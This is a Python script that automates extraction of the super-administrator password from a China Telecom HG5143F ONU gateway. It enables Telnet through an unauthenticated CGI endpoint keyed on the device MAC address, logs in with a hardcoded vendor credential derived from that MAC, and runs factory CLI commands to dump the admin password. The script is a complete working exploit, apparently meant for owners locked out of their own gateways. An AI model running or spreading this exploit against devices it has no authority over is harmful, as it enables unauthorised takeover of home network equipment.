# coding=utf-8

# AGPLv3+ License. By Gxxk(Frez79).
# 全自动获取 电信网关HG5143F(ONU) 的超管密码.
# 仅在Win10LTSC2021/Py3.12.6上测试通过.
# 基于此教程编写：https://blog.csdn.net/weixin_45736958/article/details/135500085


# 导入模块
try:
    import subprocess
    import re
    import requests
    import telnetlib
    import time
except ModuleNotFoundError:
    raise ModuleNotFoundError("请安装requests库并确保Python版本低于Py3.12!")
try:
    import pyperclip
    clipboardStat = True
except ModuleNotFoundError:
    clipboardStat = False


print(60*"H")
print("全自动获取 电信网关HG5143F(ONU) 的超管密码.")
print("HG5143F(ONU) v4.10.M5001测试有效")
print("AGPLv3+ License. By Gxxk.")
print(60*"H"+'\n')


# 设置命令执行延迟
tnCmdDelay = "0.09" if (value := input(
    "Telnet命令执行延迟(单位秒)(0.1s):")) == "" else value  # 命令执行延迟
try:
    tnCmdDelay = float(tnCmdDelay)
    if tnCmdDelay<=0.08:
        print("WARNING: 一般的家庭网络下,过低的命令执行延迟大概率会增大网络延迟使操作失败的可能性.")
except ValueError:
    raise ValueError("请输入一个正确的值")


# 网关信息获取
ip = "192.168.1.1" if (ip := input("网关IP(192.168.1.1):")) == "" else ip # 网关IP
mac = subprocess.check_output(
    f"arp -a {ip}", shell=True).decode('utf-8', errors='ignore').upper() # 网关MAC码获取
try:
    mac = re.search("[A-F0-9]{2}(-[A-F0-9]{2}){5}",
                    mac).group().split("-")  # 从命令输出中提取网关MAC码
except:
    raise Exception("MAC信息获取失败！")
print(f"网关MAC: {":".join(mac)}.")


# 开启网关Telnet
requestStat = requests.get(
    f"http://{ip}:8080/cgi-bin/telnetenable.cgi?key={''.join(mac)}&telnetenable=1")
if requestStat.status_code != 200:
    raise Exception("无法开启Telnet! 请检查型号/版本或网关可用性")


tnUsername = "telnetadmin"  # Telnet用户名
tnPwd = f"FH-nE7jA%5m{mac[-6:]}"  # Telnet密码

with telnetlib.Telnet(ip, port=23) as tn:
    tnUsername = "telnetadmin"  # Telnet用户名
    tnPwd = f"FH-nE7jA%5m{''.join(mac[-3:])}"  # Telnet密码
    time.sleep(tnCmdDelay)

    tn.write(f"{tnUsername}\n".encode())
    print(f"输入用户名：{tnUsername}")
    time.sleep(tnCmdDelay)

    tn.write(f"{tnPwd}\n".encode())
    print(f"输入密码：{tnPwd}")
    time.sleep(tnCmdDelay)

    tn.write(b"load_cli factory\nshow admin_pwd\n")
    print("尝试获取超密...")
    time.sleep(tnCmdDelay)
    
    tnContent = tn.read_very_eager().decode('ascii')

    output = re.search(r"telecomadmin\d{8}", tnContent)
    print(f"TelnetLog:\n{tnContent}\n")
    print(60*"H")
    if output:
        print(
            f"获取成功. 超密{'[已复制至剪贴板]' if clipboardStat else ''}:{output.group()}")
        if clipboardStat:
            pyperclip.copy(output.group())
    else:
        print("未能获取超密,请检查 版本/型号 或增大命令执行延迟后再试一次.或许可以跟着教程手动走一遍？\n教程：https://blog.csdn.net/weixin_45736958/article/details/135500085")

input('回车键以退出...')
